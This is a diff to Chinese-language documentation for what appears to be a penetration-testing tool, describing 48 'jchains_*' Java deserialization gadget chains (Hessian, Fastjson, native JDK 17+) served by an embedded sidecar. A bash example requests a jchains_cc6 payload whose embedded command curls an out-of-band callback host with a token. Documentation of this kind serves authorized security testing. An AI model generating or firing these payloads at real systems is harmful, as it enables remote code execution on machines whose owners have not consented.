@@ -539,12 +539,15 @@ curl -sf -H "Authorization: Bearer $JWT" \
 ### 7.7 java-chains 增强链（`jchains_*`，48 条）
 
 > java-chains 以 sidecar 内嵌方式运行，监听 `:8011`，无需单独部署。  
-> `jchains_*` 链相比内置链的优势：**直接命令执行**（无需 JNDI），且无 `_tfactory` NPE 问题。
+> `jchains_*` 相比内置链的优势：
+> - **Hessian 链**：修复了 marshalsec 的 `_tfactory` NPE 问题，提供更多 gadget 变体（exec/bcel/rome/spring2…）
+> - **Fastjson 链**：提供 BCEL / C3P0+H2 等非 JNDI 路径，不依赖 LDAP/RMI 服务器回显
+> - **原生反序列化**：支持 JDK 17+（`jchains_native_jdk17_1/2`），ysoserial 部分链在 JDK 17 下无法运行
 
 **用法与内置链完全相同，只需换 chain ID：**
 
 ```bash
-# 直接命令执行（exec 类，无需 JNDI）
+# Hessian exec 类链（直接命令执行）
 curl -sf -X POST $OOB_SIDECAR/generate \
   -H "Content-Type: application/json" \
   -d '{"chain":"jchains_cc6","params":{"cmd":"curl http://'"$OOB"':8010/callback/http/'"$TOKEN"'"}}'
